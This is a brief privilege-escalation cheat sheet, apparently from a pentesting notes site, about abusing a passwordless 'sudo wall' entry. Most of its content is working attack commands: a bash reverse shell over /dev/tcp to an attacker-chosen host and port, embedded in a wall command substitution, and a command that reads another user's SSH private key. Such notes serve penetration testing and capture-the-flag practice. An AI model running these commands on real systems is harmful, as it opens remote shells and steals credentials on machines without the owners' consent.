---
title: Sudo Wall Privilege Escalation
description: Wall command can display the result of OS command. Executing as root might be vulnerable to privilege escalation (PrivEsc).
tags:
    - Privilege Escalation
refs:
date: 2023-02-05
draft: false
---

## Investigation

```sh
sudo -l

(ALL) NOPASSWD: wall
```

<br />

## Exploitation

```sh
# Reverse shell
sudo wall "$(bash -c 'bash -i >& /dev/tcp/<local-ip>/<local-port> 0>&1')"

# Gets a SSH private key of another user
sudo wall "$(cat /home/user/.ssh/id_rsa)"
```
